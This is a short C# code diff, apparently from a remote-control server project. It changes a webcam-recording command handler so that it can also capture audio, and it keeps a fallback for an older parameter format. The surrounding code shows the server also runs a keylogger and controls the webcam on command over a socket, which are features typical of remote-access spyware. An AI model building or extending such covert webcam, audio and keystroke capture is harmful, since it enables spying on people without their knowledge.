@@ -105,8 +105,24 @@ namespace RemoteControlServer.Core
                     SocketManager.SendJson(socket, "LOG", "Đã tắt Webcam");
                     break;
                 case "RECORD_WEBCAM":
-                    int seconds = 10; int.TryParse(packet.param, out seconds);
-                    string result = WebcamManager.StartRecording(seconds); SocketManager.SendJson(socket, "LOG", result);
+                    try
+                    {
+                        // Try to parse as JSON with audio flag
+                        var recordData = JsonConvert.DeserializeObject<dynamic>(packet.param);
+                        int duration = (int)(recordData.duration ?? 10);
+                        bool includeAudio = (bool)(recordData.audio ?? false);
+                        
+                        string result = WebcamManager.StartRecording(duration, includeAudio);
+                        SocketManager.SendJson(socket, "LOG", result);
+                    }
+                    catch
+                    {
+                        // Fallback: param is just a number (old format)
+                        int seconds = 10;
+                        int.TryParse(packet.param, out seconds);
+                        string result = WebcamManager.StartRecording(seconds, false);
+                        SocketManager.SendJson(socket, "LOG", result);
+                    }
                     break;
                 case "START_KEYLOG":
                     if (!KeyLoggerService.IsRunning)
